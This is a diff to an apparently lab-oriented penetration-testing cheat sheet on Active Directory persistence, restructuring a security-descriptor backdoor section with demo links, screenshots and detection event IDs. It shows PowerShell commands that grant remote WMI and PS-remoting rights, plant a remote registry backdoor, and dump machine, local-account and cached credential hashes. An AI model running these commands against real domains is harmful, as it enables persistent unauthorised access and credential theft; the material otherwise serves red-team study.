@@ -15,9 +15,11 @@ permalink: /pen/ad/persist
 * [dsrm](#dsrm)
 * [golden-gmsa](#golden-gmsa)
 * [security-descriptors](#security-descriptors)
-	* [set-remoteWMI](#set-remoteWMI)
-	* [set-remotePSRemoting](#set-remotePSRemoting)
-	* [add-remoteRegBackdoor](#add-remoteRegBackdoor)
+	* [DCOM](#DCOM)
+	* [Powershell](#Powershell)
+	* [Registry](#Registry)
+	* [SC Manager](#SCManager)
+	* [WMI](#WMI)
 * [skeleton-key](#skeleton-key)
 
 <!-- vscode-markdown-toc-config
@@ -134,6 +136,8 @@ Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLog
 
 🔎️ DETECT :
 ```powershell
+# EID: 4657 - Registry value modified
+# EID: 12 - Registry Object Created/Deletion (sysmon)
 ```
 
 🛟 MITIGATE :
@@ -167,10 +171,9 @@ GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
 ```powershell
 ```
 
-- [trustedsec](https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks)
-
 🕮 READ MORE at :
 - [thehacker.recipes/ad/persistence/goldengmsa](https://www.thehacker.recipes/ad/persistence/goldengmsa).
+- [trustedsec](https://www.trustedsec.com/blog/splunk-spl-queries-for-detecting-gmsa-attacks)
 
 
 ## <a name='security-descriptors'></a>security-descriptors
@@ -178,19 +181,22 @@ GoldenGMSA.exe gmsainfo --sid "S-1-5-21-[...]1586295871-1112"
 🔑 KEYPOINTS :
 - 
 
-🕮 READ MORE at :
-- [hacktricks/security-descriptors](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/security-descriptors)
+▶️ PLAY :
 
-### <a name='set-remoteWMI'></a>set-remoteWMI
+### <a name='DCOM'></a>DCOM
+
+- [DEMO DCOM backdoor](https://www.youtube.com/watch?v=e-tYtfmcoWk)
+![](ad-persist-sd-DCOM-invoke-dcombackdoor.png)
+![](ad-persist-sd-DCOM-invoke-dcombackdoortrigger.png)
+
 ```powershell
-# grant WMI remote execution to a user
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
-
-# remove the grant of WMI remote execution
-Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose
+# set-RemoteDCOM
 ```
 
-### <a name='set-remotePSRemoting'></a>set-remotePSRemoting
+### <a name='Powershell'></a>Powershell
+
+![](ad-persist-sd-PS-set-remotePSRemoting.png)
+
 ```powershell
 # grant PS remote execution to a user
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
@@ -199,7 +205,16 @@ Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
 Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove
 ```
 
-### <a name='add-remoteRegBackdoor'></a>add-remoteRegBackdoor
+### <a name='Registry'></a>Registry
+
+- [DEMO remote registry](https://www.youtube.com/watch?v=pOHO3hdTKyw)
+
+![](ad-persist-sd-REG-add-regbackdoor2.png)
+![](ad-persist-sd-REG-add-regbackdoor.png)
+![](ad-persist-sd-REG-get-machinehash2.png)
+![](ad-persist-sd-REG-get-machinehash.png)
+![](ad-persist-sd-REG-invoke-remoteregbackdoor.png)
+
 ```powershell
 # allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
 Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose
@@ -214,7 +229,36 @@ Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose
 Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
 ```
 
-* [](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
+### <a name='SCManager'></a>SC Manager
+
+- [DEMO SCM backdoor](https://www.youtube.com/watch?v=tETNO22zVKM) / service creation
+
+![](/assets/images/ad-persist-sd-SCM-add-scmsd.png)
+![](/assets/images/ad-persist-sd-SCM-sc-create.png)
+![](/assets/images/ad-persist-sd-SCM-services.msc.png)
+
+```powershell
+```
+
+### <a name='WMI'></a>WMI
+
+- [DEMO WMI backdoor](https://www.youtube.com/watch?v=C1OpX_n7HlY)
+
+![](/assets/images/ad-persist-sd-WMI-invoke-wmimethod.png)
+![](/assets/images/ad-persist-sd-WMI-set-remotewmi.png)
+![](/assets/images/ad-persist-sd-WMI-set-wmipersist.png)
+
+```powershell
+# grant WMI remote execution to a user
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
+
+# remove the grant of WMI remote execution
+Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose
+```
+
+🕮 READ MORE at :
+- [hacktricks/security-descriptors](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/security-descriptors)
+- [edemilliere / Invoke-ADSDPropagation](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)
 
 
 ## <a name='skeleton-key'></a>skeleton-key
